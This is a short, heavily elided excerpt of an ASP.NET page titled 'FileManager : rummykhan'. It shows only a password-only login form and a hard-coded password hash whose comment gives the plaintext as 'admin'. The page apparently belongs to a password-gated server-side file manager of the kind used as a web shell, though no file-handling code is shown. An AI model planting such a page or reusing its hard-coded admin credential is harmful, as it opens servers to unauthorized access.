...
<script runat="server">
    ...
    public const string Password = "87fe22e205bc71bddff5f29257bcf2d5";//admin
...
<head runat="server">
    <title>FileManager : rummykhan</title>
    <style type="text/css">
...
<body>
    <form id="form1" runat="server">
		...
		<span class="myFont">Password:</span>
		<asp:TextBox ID="txtPass" runat="server"></asp:TextBox>
		<asp:Button ID="btnLogin" runat="server" Text="Login" OnClick="btnLogin_Click"/>
         <br /><span class="myFont">Powered By rummykhan!!</span>
	    </div>
